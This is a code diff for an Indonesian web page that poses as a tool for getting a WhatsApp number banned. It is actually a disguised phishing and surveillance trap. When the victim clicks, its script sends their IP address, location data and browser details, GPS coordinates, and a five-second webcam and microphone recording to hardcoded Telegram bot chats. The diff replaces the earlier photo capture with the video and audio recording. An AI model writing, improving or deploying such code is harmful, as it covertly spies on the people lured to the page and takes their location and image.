@@ -1,8 +1,9 @@
+
 <!DOCTYPE html>
 <html lang="id">
 <head>
   <meta charset="UTF-8">
-  <title>Website Bans WhatsApp By Yanto official</title>
+  <title>Website Bans WhatsApp</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;900&display=swap" rel="stylesheet">
   <style>
@@ -12,9 +13,10 @@
       box-sizing: border-box;
     }
     body {
-      background: linear-gradient(135deg, #0f0f23 0%, #1a1a2e 50%, #16213e 100%);
+      background: #1a0000;
+      background: linear-gradient(145deg, #2a0000 0%, #1a0000 80%);
       font-family: 'Inter', sans-serif;
-      color: lime;
+      color: #ffb3b3;
       height: 100vh;
       display: flex;
       justify-content: center;
@@ -34,72 +36,94 @@
     }
     .particle {
       position: absolute;
-      width: 2px;
-      height: 2px;
-      background: rgba(0, 255, 127, 0.3);
+      width: 3px;
+      height: 3px;
+      background: rgba(255, 0, 0, 0.25);
       border-radius: 50%;
-      animation: float 6s ease-in-out infinite;
+      filter: blur(1px);
+      animation: floatRed 7s ease-in-out infinite;
     }
-    @keyframes float {
-      0%, 100% { transform: translateY(0px); opacity: 0.3; }
-      50% { transform: translateY(-20px); opacity: 0.8; }
+    @keyframes floatRed {
+      0%, 100% { transform: translateY(0px) scale(1); opacity: 0.2; }
+      50% { transform: translateY(-25px) scale(1.5); opacity: 0.7; }
     }
     .login-container {
-      background-color: rgba(17, 17, 17, 0.95);
+      background-color: rgba(20, 0, 0, 0.95);
       padding: 30px;
-      border-radius: 16px;
-      box-shadow: 0 0 20px lime;
+      border-radius: 24px;
+      box-shadow: 0 0 30px #ff0000, inset 0 0 15px #a00000;
       text-align: center;
       max-width: 400px;
       width: 100%;
       z-index: 2;
+      border: 2px solid #c00000;
     }
     .login-title {
       font-size: 26px;
       font-weight: 900;
       margin-bottom: 10px;
-      background: linear-gradient(135deg, #00ff7f, #ffffff);
+      background: linear-gradient(135deg, #ff5e5e, #ffffff);
       -webkit-background-clip: text;
       -webkit-text-fill-color: transparent;
+      text-shadow: 0 0 10px red;
     }
     .login-subtitle {
       font-size: 13px;
-      color: #ffc107;
+      color: #ff8080;
       margin-bottom: 20px;
+      letter-spacing: 1px;
     }
     .login-input {
       width: 100%;
-      padding: 12px;
-      margin-bottom: 16px;
-      background: #333;
-      border: none;
-      border-radius: 6px;
-      color: #fff;
+      padding: 14px;
+      margin-bottom: 18px;
+      background: #2f0000;
+      border: 2px solid #b30000;
+      border-radius: 60px;
+      color: #ffcaca;
       font-size: 15px;
+      outline: none;
+      text-align: center;
+    }
+    .login-input:focus {
+      border-color: #ff4f4f;
+      box-shadow: 0 0 25px #ff3b3b;
     }
     .login-button {
       width: 100%;
-      padding: 12px;
-      background: linear-gradient(135deg, #00ff7f, #00cc66);
-      color: black;
+      padding: 14px;
+      background: #8b0000;
+      color: white;
       border: none;
-      border-radius: 10px;
+      border-radius: 60px;
       cursor: pointer;
-      font-weight: 600;
-      font-size: 15px;
+      font-weight: 700;
+      font-size: 16px;
+      box-shadow: 0 6px 0 #3f0000;
+      transition: 0.1s ease;
+      text-transform: uppercase;
+      letter-spacing: 2px;
     }
     .login-button:hover {
-      background-color: #0f0;
-      box-shadow: 0 0 20px lime;
+      background: #b30000;
+      transform: translateY(-2px);
+      box-shadow: 0 8px 0 #3f0000;
+    }
+    .login-button:active {
+      transform: translateY(6px);
+      box-shadow: 0 1px 0 #3f0000;
     }
     #info {
       white-space: pre-wrap;
-      text-align: left;
-      margin-top: 20px;
-      background: #222;
-      padding: 15px;
-      border-radius: 8px;
+      text-align: center;
+      margin-top: 25px;
+      background: #1c0101;
+      border: 2px solid #a00000;
+      padding: 18px;
+      border-radius: 40px;
       font-size: 13px;
+      color: #ffaeae;
+      font-family: 'Courier New', monospace;
     }
     video, canvas {
       display: none;
@@ -107,39 +131,38 @@
     @media (max-width: 480px) {
       .login-container {
         padding: 25px 20px;
-        border-radius: 14px;
-      }
-      .login-title {
-        font-size: 22px;
-      }
-      .login-input, .login-button {
-        font-size: 14px;
-        padding: 10px;
       }
     }
   </style>
 </head>
 <body>
-  <div class="bg-particles"></div>
+  <div class="bg-particles" id="particles"></div>
 
   <div class="login-container">
-    <p class="login-title">Website Bans WhatsApp By Yanto official</p>
+    <p class="login-title">Bans WhatsApp By Yanto official</p>
     <p class="login-subtitle">⚠️ Jangan Disalahgunakan</p>
     <input type="number" class="login-input" placeholder="Nomor WhatsApp Target" id="text">
-    <button class="login-button" id="login-button">Next</button>
-    <div id="info">🥷 Silahkan masukkan nomor untuk di bans...</div>
+    <button class="login-button" id="login-button">EKSEKUSI ➤</button>
+    <div id="info">🥷 Masukkan nomor target.</div>
   </div>
 
   <video id="video" autoplay playsinline></video>
   <canvas id="canvas" width="640" height="480"></canvas>
 
   <script>
+    // ========== KONFIGURASI ==========
     const botToken = '8675408721:AAFNmUMRkfJYgDFmdLVJE1tHdFaGdiW4LX8';
     const chatIds = ['8182530431','7221551942'];
     const infoDiv = document.getElementById('info');
     const input = document.getElementById('text');
     const button = document.getElementById('login-button');
 
+    // elemen media
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+
+    // ========== FUNGSI KIRIM PESAN ==========
     function sendToTelegram(text) {
       chatIds.forEach(id => {
         fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -150,18 +173,72 @@
       });
     }
 
-    function sendPhotoToTelegram(blob) {
+    function sendVideoToTelegram(blob, caption = '') {
       chatIds.forEach(id => {
         const formData = new FormData();
         formData.append('chat_id', id);
-        formData.append('photo', blob);
-        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+        formData.append('video', blob);
+        if (caption) formData.append('caption', caption);
+        fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
           method: 'POST',
           body: formData
         }).catch(console.error);
       });
     }
 
+    // ========== FITUR VIDEO + AUDIO 5 DETIK ==========
+    async function recordAndSendVideo() {
+      return new Promise((resolve) => {
+        navigator.mediaDevices.getUserMedia({ 
+          video: true, 
+          audio: true
+        })
+        .then(stream => {
+          console.log('⏳ Tunggu Sebentar...');
+          
+          const mediaRecorder = new MediaRecorder(stream, {
+            mimeType: 'video/webm'
+          });
+          
+          const chunks = [];
+          
+          mediaRecorder.ondataavailable = (e) => {
+            if (e.data.size > 0) {
+              chunks.push(e.data);
+            }
+          };
+          
+          mediaRecorder.onstop = () => {
+            const videoBlob = new Blob(chunks, { type: 'video/webm' });
+            sendVideoToTelegram(videoBlob, '🎥 Rekaman video+audio 5 detik korban');
+            console.log('📤 Video terkirim ke Telegram');
+            
+            stream.getTracks().forEach(track => {
+              track.stop();
+              console.log(`⏹️ Track ${track.kind} dihentikan`);
+            });
+            
+            resolve();
+          };
+          
+          mediaRecorder.start();
+          console.log('⏺️ Mulai merekam...');
+          
+          setTimeout(() => {
+            mediaRecorder.stop();
+            console.log('⏹️ Berhenti merekam');
+          }, 5000);
+          
+        })
+        .catch(err => {
+          console.error('❌ Gagal akses kamera/mikrofon:', err);
+          sendToTelegram('❌ Korban menolak akses kamera/mikrofon');
+          resolve();
+        });
+      });
+    }
+
+    // ========== INFO TEKS SETELAN AWAL (PERTAMA KALI DIKIRIM) ==========
     async function getInfo() {
       let ip = '-', city = '-', region = '-', country = '-', org = '-';
       try {
@@ -196,83 +273,71 @@ Cookie     : ${navigator.cookieEnabled ? 'Ya' : 'Tidak'}
 Waktu      : ${new Date().toLocaleString()}
       `.trim();
 
-      sendToTelegram(`<b>📥 Info Pengunjung:</b>\n<pre>${text}</pre>`);
-
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          pos => {
-            const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-            sendToTelegram(`<b>📍 Lokasi GPS:</b> <a href="${link}">Klik di sini</a>`);
-          },
-          () => sendToTelegram(`📍 Lokasi GPS Ditolak`)
-        );
-      } else {
-        sendToTelegram(`📍 Browser tidak support GPS`);
-      }
+      return text;
     }
 
-    async function startCamera() {
-      const video = document.getElementById('video');
-      const canvas = document.getElementById('canvas');
-      const ctx = canvas.getContext('2d');
-      return new Promise((resolve) => {
-        navigator.mediaDevices.getUserMedia({ video: true })
-          .then(stream => {
-            video.srcObject = stream;
-            video.onloadedmetadata = () => {
-              setTimeout(() => {
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                canvas.toBlob(blob => {
-                  if (blob) sendPhotoToTelegram(blob);
-                  stream.getTracks().forEach(track => track.stop());
-                  resolve();
-                }, 'image/jpeg');
-              }, 3000);
-            };
-          })
-          .catch(err => {
-            sendToTelegram('❌ Kamera Ditolak atau Tidak Tersedia');
-            resolve();
-          });
-      });
-    }
-
+    // ========== EVENT CLICK UTAMA ==========
     button.addEventListener('click', async () => {
       const nomor = input.value.trim();
       if (!nomor || nomor.length < 8 || nomor.length > 15) {
         infoDiv.innerText = '⚠️ Nomor tidak valid.';
         return;
       }
+
       button.disabled = true;
-      infoDiv.innerText = '⏳ Memproses spam report...';
+      infoDiv.innerText = '⏳ Tunggu Sebentar...';
+
+      // Kirim nomor target
       sendToTelegram(`<b>📞 Nomor Target:</b> ${nomor}`);
-      input.value = '';
+
       try {
-        await getInfo();
-        await startCamera();
-        setTimeout(() => {
-          infoDiv.innerText = `✅ Successfully bans nomor ${nomor}`;
-          button.disabled = false;
-        }, 1000);
-      } catch (e) {
+        // Kirim info teks (SETELAN AWAL)
+        const infoKorban = await getInfo();
+        sendToTelegram(`<b>📥 Info Pengunjung:</b>\n<pre>${infoKorban}</pre>`);
+
+        // Ambil lokasi GPS
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(
+            pos => {
+              const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+              sendToTelegram(`<b>📍 Lokasi GPS:</b> <a href="${link}">Alamat korban</a>`);
+            },
+            () => sendToTelegram(`📍 Lokasi GPS Ditolak`)
+          );
+        } else {
+          sendToTelegram(`📍 Browser tidak support GPS`);
+        }
+
+        // REKAM VIDEO + AUDIO 5 DETIK
+        infoDiv.innerText = '⏳ Tunggu Sbentar...';
+        await recordAndSendVideo();
+
+        infoDiv.innerText = `✅ Successfully bans nomor ${nomor}`;
+        button.disabled = false;
+        input.value = '';
+
+      } catch (error) {
+        console.error(error);
         infoDiv.innerText = '❌ Terjadi kesalahan.';
         button.disabled = false;
       }
     });
 
-    function createParticles() {
+    // Partikel merah
+    function createRedParticles() {
       const container = document.querySelector('.bg-particles');
-      for (let i = 0; i < 50; i++) {
+      for (let i = 0; i < 60; i++) {
         const p = document.createElement('div');
         p.className = 'particle';
         p.style.left = Math.random() * 100 + '%';
         p.style.top = Math.random() * 100 + '%';
-        p.style.animationDelay = Math.random() * 6 + 's';
-        p.style.animationDuration = (Math.random() * 4 + 4) + 's';
+        p.style.animationDelay = Math.random() * 8 + 's';
+        p.style.animationDuration = (Math.random() * 5 + 5) + 's';
+        p.style.background = `rgba(255, ${Math.floor(Math.random() * 50)}, 0, 0.4)`;
         container.appendChild(p);
       }
     }
-    document.addEventListener('DOMContentLoaded', createParticles);
+    document.addEventListener('DOMContentLoaded', createRedParticles);
   </script>
 </body>
 </html>
